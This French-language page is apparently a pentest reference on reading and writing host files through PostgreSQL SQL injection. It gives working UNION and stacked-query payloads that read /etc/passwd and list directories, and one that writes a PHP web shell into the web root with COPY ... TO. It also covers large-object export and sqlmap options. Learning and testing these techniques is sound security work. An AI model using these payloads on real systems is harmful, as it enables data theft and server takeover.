---
order: 4
title: "Lire et écrire des fichiers via l'injection PostgreSQL"
description: "Primitives de lecture et d'écriture de fichiers dans l'injection PostgreSQL : pg_read_file, pg_ls_dir, COPY depuis et vers des tables, et les large objects, avec les rôles requis par chacune."
keywords:
  - pg_read_file
  - pg_ls_dir
  - COPY TO
  - lo_import
  - accès aux fichiers PostgreSQL
---

# Manipulation de fichiers

Un rôle PostgreSQL privilégié peut lire et écrire des fichiers sur l'hôte, ce qui mène à la divulgation de code source et d'identifiants et, via l'écriture, à des web shells. Ces primitives nécessitent un superutilisateur ou, sur la version 11 et ultérieure, l'appartenance à `pg_read_server_files` / `pg_write_server_files`.

`pg_read_file()` renvoie le contenu d'un fichier, et `pg_ls_dir()` liste un répertoire :

```sql
' UNION SELECT pg_read_file('/etc/passwd',0,100000),NULL,NULL-- 
' UNION SELECT string_agg(f,','),NULL,NULL FROM pg_ls_dir('/etc') f-- 
```

`COPY` lit un fichier dans une table, ce qui est utile quand le canal reflété veut des lignes plutôt qu'une seule chaîne. Il nécessite une requête empilée pour créer la table :

```sql
'; CREATE TABLE f(line text); COPY f FROM '/etc/passwd'-- 
' UNION SELECT line,NULL,NULL FROM f-- 
```

L'écriture utilise `COPY ... TO`, qui dépose du contenu de l'attaquant à un chemin choisi (un web shell sous la racine du document, par exemple) :

```sql
'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/s.php'-- 
```

Pour le contenu binaire, les large objects donnent un contrôle au niveau de l'octet : `lo_import('/path')` charge un fichier dans un large object, `lo_from_bytea`/`lo_put` en construisent un à partir d'octets fournis, et `lo_export(oid,'/path')` l'écrit sur disque. Comme pour l'exécution de commandes, `COPY ... TO` et l'export de large object nécessitent une permission d'écriture pour l'utilisateur du processus PostgreSQL à la destination, si bien que connaître le répertoire de données et la racine web (lus d'abord depuis `postgresql.conf`) guide l'endroit où une écriture aboutira.

## Outils

- **sqlmap** : lit et écrit des fichiers hôtes avec `--file-read` et `--file-write`.
- **psql** : client officiel pour exécuter directement `pg_read_file`, `COPY` et les fonctions de large object.

## Références

- PostgreSQL Documentation: `pg_read_file`, `pg_ls_dir`, COPY, large objects
- OWASP Testing Guide: Testing for SQL Injection
